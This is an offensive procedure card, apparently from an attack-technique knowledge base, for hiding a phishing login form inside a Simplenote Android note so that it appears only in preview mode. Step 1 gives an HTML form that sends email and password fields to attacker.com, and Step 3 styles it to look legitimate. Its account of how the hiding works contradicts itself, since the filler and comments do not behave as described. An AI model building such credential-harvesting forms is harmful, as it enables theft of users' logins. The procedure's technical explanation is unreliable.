---
tags:
  - phishing
  - obfuscation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Android
techniques:
  - '[[Phishing]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 8d12705b-c450-4df4-ab57-e51d5016e180
created_at: '2025-12-14T17:24:42.446Z'
updated_at: '2025-12-14T17:24:42.446Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Phishing]]'
---
# Obfuscate-HTML-Form-in-Note

## Summary

This procedure hides the malicious HTML form within comments and filler text in a Simplenote note, ensuring it only reveals in preview mode to increase deception.

## Description

By wrapping HTML in comments (<!-- -->), the editor displays innocuous text, but preview strips comments, rendering the form. This evades casual inspection while exploiting the lack of sanitization in Simplenote Android v1.5.6.

## Requirements

1. Existing note with basic form HTML
2. Filler text (e.g., lorem ipsum)
3. Simplenote app for testing

## Defense

Defensive measures and detection strategies:

- Enable source view before previewing shared notes
- Use apps with strict HTML sanitization (e.g., via DOMPurify)
- Train users to avoid previewing untrusted content

## Objectives

1. Conceal form in edit mode
2. Ensure clean rendering in preview
3. Maintain form functionality

## Instructions

### Step 1: Add Filler Content

**Context**: Surround form with text to mimic normal note.

Edit note:

```html
Lorem ipsum dolor sit amet, consectetur adipiscing elit.

<!-- Hidden form starts here -->
<form action="https://attacker.com/login.php" method="POST">
  <input type="email" name="email" placeholder="Email">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
<!-- Hidden form ends -->

Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
```

> Save. Editor shows paragraphs; preview hides comments.

### Step 2: Test Obfuscation

**Context**: Verify dual-mode behavior.

Toggle to preview.

> Expected: Only form visible, no comments or filler.

### Step 3: Refine Styling

**Context**: Ensure form blends in.

Add inline styles if needed:

```html
<!-- ... -->
<form style="max-width:300px; margin: auto;">
  ...
</form>
<!-- ... -->
```

> Expected: Form appears legitimate in preview.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Phishing]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Phishing]]
- [[obfuscation]]
